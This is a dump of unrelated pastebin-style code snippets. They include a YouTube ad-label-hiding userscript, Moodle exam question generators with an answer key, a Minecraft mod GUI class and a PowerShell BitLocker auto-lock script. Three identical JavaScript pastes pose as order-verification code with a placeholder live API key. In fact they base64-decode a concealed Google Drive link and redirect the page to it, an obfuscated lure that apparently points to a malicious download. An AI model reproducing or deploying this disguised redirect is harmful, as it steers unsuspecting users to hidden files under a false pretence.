// @description  유료 광고 포함 라벨 오클릭 방지 제거 Hides YouTube ""includes promotion"" overlays & disables redirection
// @author       SAKURA
// @match        https://www.youtube.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const BLOCK_SELECTORS = [
        'a[href*=""https://support.google.com/youtube?p=ppp""]',
        '.ytm-paid-content-overlay-renderer',
        '.YtmPaidContentOverlayHost',
        '#paid-content-overlay', // 기타 다양한 이름들 고려함
        '[aria-label*=""includes promotion""]', // 접근성 기준으로도 제거
        'tp-yt-paper-tooltip' // 일부 툴팁도 차단
    ];

    const observer = new MutationObserver(() => {
        BLOCK_SELECTORS.forEach(selector => {
            document.querySelectorAll(selector).forEach(el => {
                el.remove(); // 아주 그냥 통째로 제거
            });
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
})();
"
tzP6mN4d,Market.js,dentira,JavaScript,Friday 11th of April 2025 07:39:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05458/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tFSVZpVV,Untitled,dentira,JavaScript,Friday 11th of April 2025 07:24:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89474/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SKjqYYqW,moodle preview link,mayankjoin3,Python,Friday 11th of April 2025 07:24:23 AM CDT,"#preview link is without the option marked.

start=53205
for i in range(25):
    print(f""""""https://cetpgex.iitp.ac.in/moodle/question/bank/previewquestion/preview.php?id={start}&restartversion=0&courseid=314&behaviour=deferredfeedback&maxmark=1&correctness=1&marks=2&markdp=2&feedback=1&generalfeedback=1&rightanswer=1&history&returnurl=https%3A%2F%2Fcetpgex.iitp.ac.in%2Fmoodle%2Fquestion%2Fedit.php%3Fcourseid%3D314%26amp%3Bcat%3D4833%252C36016%26amp%3Bfilter%3D%257B%2522category%2522%253A%257B%2522jointype%2522%253A1%252C%2522values%2522%253A%255B%25224833%2522%255D%252C%2522filteroptions%2522%253A%257B%2522includesubcategories%2522%253Afalse%257D%257D%252C%2522hidden%2522%253A%257B%2522jointype%2522%253A1%252C%2522values%2522%253A%255B0%255D%257D%257D%26amp%3Bdeleteall%3D1&variant=1"""""")
    start+=1
"
KXnDgiQg,unfinished screen,CreativeMasterBonin,Java,Friday 11th of April 2025 07:21:44 AM CDT,"package net.bcm.cmatd.gui;

import net.bcm.cmatd.Cmatd;
import net.bcm.cmatd.Utility;
import net.bcm.cmatd.blockentity.BaseEnergyMakerBE;
import net.minecraft.client.gui.GuiGraphics;
import net.minecraft.client.gui.screens.inventory.AbstractContainerScreen;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.level.material.Fluids;
import net.neoforged.neoforge.common.Tags;
import net.neoforged.neoforge.fluids.FluidStack;

import java.util.List;

public class FoodReactorScreen extends AbstractContainerScreen<FoodReactorMenu> {
    private static final int ENERGY_LEFT = 7;
    private static final int ENERGY_WIDTH = 121;
    private static final int ENERGY_TOP = 90;
    private static final int ENERGY_HEIGHT = 4;

    private static final int LIQUID_LEFT = 132;
    private static final int LIQUID_TOP = 16;
    private static final int LIQUID_BOTTOM = 116;
    private static final int LIQUID_RIGHT = 170;
    private static final int LIQUID_WIDTH = 38;
    private static final int LIQUID_HEIGHT = 100;

    private static final ResourceLocation BG = ResourceLocation.parse(""cmatd:textures/gui/food_reactor.png"");
    private static final ResourceLocation WHITE_BOX = ResourceLocation.parse(""minecraft:textures/block/white_stained_glass.png"");

    public FluidTankGUIRenderer fluidRenderer;

    public FoodReactorScreen(FoodReactorMenu menu, Inventory playerInventory, Component title) {
        super(menu, playerInventory, title);
        this.imageHeight = 216;
        this.imageWidth = 176;
    }

    @Override
    protected void init() {
        super.init();
        this.fluidRenderer = new FluidTankGUIRenderer(Utility.FOOD_REACTOR_FLUID_CAPACITY,
                LIQUID_WIDTH,LIQUID_HEIGHT);
    }

    @Override
    protected void renderBg(GuiGraphics guiGraphics, float partialTick, int mouseX, int mouseY) {
        guiGraphics.blit(BG, leftPos, topPos, 0, 0, this.imageWidth, this.imageHeight);
        int power = menu.getEnergy();
        int p = (int) ((power / (float) BaseEnergyMakerBE.CAPACITY) * ENERGY_WIDTH);
        guiGraphics.fillGradient(leftPos + ENERGY_LEFT, topPos + ENERGY_TOP, leftPos + ENERGY_LEFT + p, topPos + ENERGY_TOP + ENERGY_HEIGHT, Utility.BRIGHT_LIGHT_BLUE, Utility.DARKER_BLUE);
        guiGraphics.fill(leftPos + ENERGY_LEFT + p, topPos + ENERGY_TOP, leftPos + ENERGY_LEFT + ENERGY_WIDTH, topPos + ENERGY_TOP + ENERGY_HEIGHT, Utility.DARKEST_GRAYER_BLUE);
    }

    @Override
    public void render(GuiGraphics guiGraphics, int mouseX, int mouseY, float partialTick) {
        super.render(guiGraphics, mouseX, mouseY, partialTick);
        if (mouseX >= leftPos + ENERGY_LEFT && mouseX < leftPos + ENERGY_LEFT + ENERGY_WIDTH && mouseY >= topPos + ENERGY_TOP && mouseY < topPos + ENERGY_TOP + ENERGY_HEIGHT) {
            int power = menu.getEnergy();
            List<Component> components = List.of(
                    Component.translatable(""title.energy_fe_with_max"",power,menu.getBlockEntity().energyStorage.getMaxEnergyStored())
            );
            guiGraphics.renderComponentTooltip(this.font,components,mouseX,mouseY);
        }
        else if(mouseX >= leftPos + LIQUID_LEFT && mouseX < leftPos + LIQUID_LEFT + LIQUID_WIDTH && mouseY >= topPos + LIQUID_TOP && mouseY < topPos + LIQUID_TOP + LIQUID_HEIGHT){
            int liquidAmount = menu.fluidAmtStored;
            List<Component> components2 = List.of(
                    Component.translatable(""title.liquid_amt_with_max"",liquidAmount,menu.getBlockEntity().fluidTank.getCapacity())
            );
            guiGraphics.renderComponentTooltip(this.font,components2,mouseX,mouseY);
        }
        else{
            this.renderTooltip(guiGraphics, mouseX, mouseY);
        }

        //
        try{
            fluidRenderer.render(guiGraphics,new FluidStack(menu.fluidStored,Utility.FOOD_REACTOR_FLUID_CAPACITY),
                    leftPos + LIQUID_LEFT,topPos + LIQUID_TOP);
        }
        catch(Exception e){
            Cmatd.getLogger().error(""FoodReactorScreen encountered an error: {}"",e.getMessage());
        }
    }

    @Override
    protected void renderLabels(GuiGraphics guiGraphics, int mouseX, int mouseY) {
        guiGraphics.drawString(this.font, this.title,
                this.imageWidth - 169, this.imageHeight - 210, Utility.INT_WHITE, false);
        guiGraphics.drawString(this.font, this.playerInventoryTitle,
                this.imageWidth - 169, this.imageHeight - 100, Utility.INT_WHITE, false);
    }
}
"
aZEudABn,moodle mcq xml,mayankjoin3,XML,Friday 11th of April 2025 07:20:46 AM CDT,"ans = {
'Q01': 'C',
'Q02': 'B',
'Q03': 'A',
'Q04': 'A',
'Q05': 'B',
'Q06': 'A',
'Q07': 'A',
'Q08': 'A',
'Q09': 'C',
'Q10': 'A',
'Q11': 'B',
'Q12': 'A',
'Q13': 'A',
'Q14': 'D',
'Q15': 'A',
'Q16': 'B',
'Q17': 'C',
'Q18': 'A',
'Q19': 'C',
'Q20': 'A',
'Q21': 'B',
'Q22': 'B',
'Q23': 'A',
'Q24': 'B',
'Q25': 'C'
}

start = 53279

options = ['A', 'B', 'C', 'D']

with open(""questions_ENDSEM_JAN_APR25.xml"", ""w"", encoding=""utf-8"") as f:
    for i in range(1, 26):
        qid = f""Q{i:02}""
        correct = ans.get(qid, None)  # None if not specified
        question_block = f""""""<!-- question: {start}  -->
    <question type=""multichoice"">
        <name>
        <text>{qid}</text>
        </name>
        <questiontext format=""html"">
        <text><![CDATA[<p> </p>]]></text>
        </questiontext>
        <generalfeedback format=""html"">
        <text></text>
        </generalfeedback>
        <defaultgrade>1.0000000</defaultgrade>
        <penalty>0</penalty>
        <hidden>0</hidden>
        <idnumber></idnumber>
        <single>true</single>
        <shuffleanswers>false</shuffleanswers>
        <answernumbering>abc</answernumbering>
        <showstandardinstruction>0</showstandardinstruction>
        <correctfeedback format=""html"">
        <text></text>
        </correctfeedback>
        <partiallycorrectfeedback format=""html"">
        <text></text>
        </partiallycorrectfeedback>
        <incorrectfeedback format=""html"">
        <text></text>
        </incorrectfeedback>""""""

        for opt in options:
            fraction = ""100"" if correct == opt else ""0""
            question_block += f""""""
        <answer fraction=""{fraction}"" format=""html"">
        <text><![CDATA[<p>Option {opt}</p>]]></text>
        <feedback format=""html"">
            <text></text>
        </feedback>
        </answer>""""""

        question_block += """"""
    </question>\n""""""
        f.write(question_block)
        start += 1

print(""XML file 'questions.xml' generated successfully."")



#preview link is without the option marked.

#Mcq testing 
#start=53304
#for i in range(25):
#    print(f""""""https://cetpgex.iitp.ac.in/moodle/question/bank/previewquestion/preview.php?id={start}&restartversion=0&courseid=314&returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D314%26cat%3D4836%252C36016%26deleteall%3D1"""""")

    
#    start+=1
"
mYRn9R4V,Products.js,dentira,JavaScript,Friday 11th of April 2025 07:09:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75256/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LSC1CfZ8,AutoLock VHD,Nom1fan,PowerShell,Friday 11th of April 2025 07:03:01 AM CDT,"$driveLetter = ""V:""  # Set your drive letter here
$idleMinutes = 1
$idleThreshold = $idleMinutes * 60

# Define native method for idle detection
Add-Type @""
using System;
using System.Runtime.InteropServices;

public static class IdleTime {
    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport(""user32.dll"")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    public static int GetIdleTimeInSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) {
            return 0;
        }
        return (Environment.TickCount - (int)lii.dwTime) / 1000;
    }
}
""@

function Get-IdleTime {
    return [IdleTime]::GetIdleTimeInSeconds()
}

Write-Host ""Auto-lock script running. Will lock $driveLetter after $idleMinutes minutes of inactivity.""

while ($true) {
    $idleTime = Get-IdleTime
    Write-Host ""Idle time: $idleTime seconds""

    if ($idleTime -ge $idleThreshold) {
        Write-Host ""Idle for $idleTime seconds. Locking drive $driveLetter...""
        manage-bde -lock $driveLetter -ForceDismount

        # Wait for some activity before continuing (reset loop after user returns)
        do {
            Start-Sleep -Seconds 10
            $idleTime = Get-IdleTime
        } while ($idleTime -ge 30)

        Write-Host ""User activity detected. Resuming idle monitoring...""
    }

    Start-Sleep -Seconds 30
}
"
